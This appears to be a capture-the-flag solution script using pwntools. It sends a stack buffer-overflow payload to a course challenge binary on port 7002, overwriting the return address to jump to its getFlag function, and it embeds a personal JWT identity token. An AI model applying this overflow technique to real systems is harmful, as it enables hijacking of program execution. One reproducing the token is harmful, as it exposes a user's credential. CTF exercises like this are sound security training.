from pwnlib import *

from ctf_helper import *

id_token = "eyJhbGciOiJFZERTQSIsImtpZCI6ImlkIiwidHlwIjoiSldUIn0.eyJzdWIiOiJUaG9tYXMuQmFydGgiLCJpc3MiOiJodHRwczovL2luZjIyNi5wdWZmbGluZy5ubyIsImlhdCI6MTc1OTEzMzcwMCwic2NvcGUiOlsiaWQiXX0.ogTDQS92Ul2wctc2BY-pjcnq8V6uKPo2nhpvDZYLuHfUtQYcAZvbJT00jzV03oJHpVRXm31qMUdvtJ-05733BQ"  # insert your token here

elf = ELF("./task-2")
io: tube = start(7002)
read_welcome(id_token)


print("func: ", elf.functions.getFlag)
GETFLAG = 0x4013aa + 5
payload = b"Z" * 40
payload += p32(0)
payload += p32(0)
payload += b"Z" * 8
payload += b"Z" * 8
payload += b"Z" * 8
payload += p64(GETFLAG)
payload += b"\n"


io.send(payload)


io.interactive()
